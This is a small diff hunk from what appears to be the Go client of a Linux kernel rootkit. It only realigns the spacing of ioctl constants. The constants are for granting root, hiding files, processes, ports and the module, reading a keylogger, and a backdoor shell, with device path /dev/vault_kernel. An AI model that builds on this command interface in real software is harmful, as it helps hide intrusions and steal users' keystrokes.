@@ -27,20 +27,20 @@ import (
 const (
 	vaultMagic = 0xC0
 
-	ioctlGiveRoot       = (vaultMagic << 8) | 0x01
-	ioctlHideFile       = (vaultMagic << 8) | 0x02
-	ioctlUnhideFile     = (vaultMagic << 8) | 0x03
-	ioctlHidePID        = (vaultMagic << 8) | 0x04
-	ioctlUnhidePID      = (vaultMagic << 8) | 0x05
-	ioctlHidePort       = (vaultMagic << 8) | 0x06
-	ioctlUnhidePort     = (vaultMagic << 8) | 0x07
-	ioctlListHidden     = (vaultMagic << 8) | 0x08
-	ioctlKeylogRead     = (vaultMagic << 8) | 0x09
-	ioctlKeylogClear    = (vaultMagic << 8) | 0x0A
-	ioctlBackdoorShell  = (vaultMagic << 8) | 0x0B
-	ioctlBackdoorMagic  = (vaultMagic << 8) | 0x0C
-	ioctlModuleHide     = (vaultMagic << 8) | 0x0D
-	ioctlModuleUnhide   = (vaultMagic << 8) | 0x0E
+	ioctlGiveRoot      = (vaultMagic << 8) | 0x01
+	ioctlHideFile      = (vaultMagic << 8) | 0x02
+	ioctlUnhideFile    = (vaultMagic << 8) | 0x03
+	ioctlHidePID       = (vaultMagic << 8) | 0x04
+	ioctlUnhidePID     = (vaultMagic << 8) | 0x05
+	ioctlHidePort      = (vaultMagic << 8) | 0x06
+	ioctlUnhidePort    = (vaultMagic << 8) | 0x07
+	ioctlListHidden    = (vaultMagic << 8) | 0x08
+	ioctlKeylogRead    = (vaultMagic << 8) | 0x09
+	ioctlKeylogClear   = (vaultMagic << 8) | 0x0A
+	ioctlBackdoorShell = (vaultMagic << 8) | 0x0B
+	ioctlBackdoorMagic = (vaultMagic << 8) | 0x0C
+	ioctlModuleHide    = (vaultMagic << 8) | 0x0D
+	ioctlModuleUnhide  = (vaultMagic << 8) | 0x0E
 )
 
 const devicePath = "/dev/vault_kernel"
